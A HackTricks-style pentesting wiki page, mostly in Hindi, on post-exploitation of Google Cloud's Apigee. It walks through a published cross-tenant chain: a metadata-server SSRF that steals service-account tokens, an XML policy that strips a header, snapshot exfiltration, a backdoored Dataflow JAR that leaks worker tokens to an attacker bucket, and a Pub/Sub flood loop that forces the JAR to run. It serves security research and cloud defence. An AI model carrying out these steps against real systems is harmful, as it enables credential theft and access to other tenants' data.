# GCP - Apigee Post Exploitation

{{#include ../../../banners/hacktricks-training.md}}

## Apigee metadata SSRF -> Dataflow cross-tenant pivot

एक single Apigee tenant project का दुरुपयोग करके Message Processor metadata server तक पहुँच बनाई जा सकती है, उसका service account चोरी किया जा सकता है, और फिर shared Dataflow analytics pipeline में pivot किया जा सकता है जो cross-tenant buckets को पढ़ता/लिखता है।

### Expose the metadata server through Apigee

- Apigee proxy target को `http://169.254.169.254` पर सेट करें और `/computeMetadata/v1/instance/service-accounts/default/token` से `Metadata-Flavor: Google` के साथ tokens का अनुरोध करें।
- GCP metadata उन अनुरोधों को अस्वीकार करता है जिनमें `X-Forwarded-For` शामिल होता है; Apigee डिफ़ॉल्ट रूप से इसे जोड़ता है। प्रॉक्सी करने से पहले इसे `AssignMessage` से हटा दें:
```xml
<AssignMessage name="strip-xff">
<Remove>
<Headers>
<Header name="X-Forwarded-For"/>
</Headers>
</Remove>
<IgnoreUnresolvedVariables>true</IgnoreUnresolvedVariables>
</AssignMessage>
```
### चोरी हुए Apigee service account को enumerate करें

- The leaked SA (Google-managed under `gcp-sa-apigee`) को [gcpwn](https://github.com/NetSPI/gcpwn) जैसे tools से enumerate करके permissions का तेजी से परीक्षण किया जा सकता है।
- नज़र आने वाली शक्तिशाली अनुमतियों में शामिल थे **Compute disk/snapshot admin**, **GCS read/write across tenant buckets**, और **Pub/Sub topic publish**। बुनियादी खोज:
```bash
gcloud compute disks list --project <tenant-project>
```
### Snapshot exfiltration अस्पष्ट प्रबंधित सेवाओं के लिए

With disk/snapshot rights आप managed runtimes को ऑफ़लाइन निरीक्षण कर सकते हैं भले ही आप tenant project में लॉग इन न कर सकें:

1. tenant project में लक्ष्य disk का एक snapshot बनाएं।
2. snapshot को अपनी project में copy/migrate करें।
3. snapshot से disk फिर से बनाकर उसे अपनी VM से attach करें।
4. logs/configs को mount करके निरीक्षण करें ताकि internal bucket नाम, service accounts, और pipeline options पुनर्प्राप्त किए जा सकें।

### Dataflow dependency replacement writable staging bucket के माध्यम से

- Analytics workers ने startup पर GCS staging bucket से JARs pulled किए। चूँकि Apigee SA के पास bucket write था, इसलिए JAR को डाउनलोड करके patch करें (उदा., Recaf के साथ) ताकि वह `http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token` को कॉल करे और **Dataflow worker** token चोरी कर ले।
- Dataflow workers के पास internet egress नहीं था; token को attacker-controlled GCS bucket में लिखकर in-cluster GCP APIs का उपयोग करके exfiltrate करें।

### autoscaling को दुरुपयोग करके malicious JAR का execution मजबूर करें

Existing workers replaced artifacts को reload नहीं करेंगे। नए workers को trigger करने के लिए pipeline input को flood करें:
```bash
for i in {1..5000}; do
gcloud pubsub topics publish apigee-analytics-notifications \
--message "flood-$i" --project <tenant-project>
done
```
नए provision किए गए instances patched JARs को fetch करते हैं और Dataflow SA token को leak कर देते हैं।

### क्रॉस-टेनेंट बकेट डिजाइन दोष

Decompiled Dataflow code ने एक साझा metadata bucket के तहत `revenue/edge/<api|mint>/tenant2TenantGroupCacheDir` जैसे cache paths दिखाए, जिनमें कोई tenant-विशेष घटक नहीं था। Dataflow token के साथ आप read/write कर सकते हैं:

- `tenantToTenantGroup` caches अन्य tenants के project+environment नाम उजागर करते हैं।
- `customFields` और `datastores` फ़ोल्डर per-request analytics रखते हैं (जिसमें end-user IPs और plaintext access tokens शामिल हैं) सभी tenants में।
- Write access का मतलब संभावित analytics tampering/poisoning हो सकता है।

## संदर्भ

- [GatewayToHeaven: Finding a Cross-Tenant Vulnerability in GCP's Apigee](https://omeramiad.com/posts/gatewaytoheaven-gcp-cross-tenant-vulnerability/)
- [AssignMessage policy - header removal](https://cloud.google.com/apigee/docs/api-platform/reference/policies/assign-message-policy)

{{#include ../../../banners/hacktricks-training.md}}
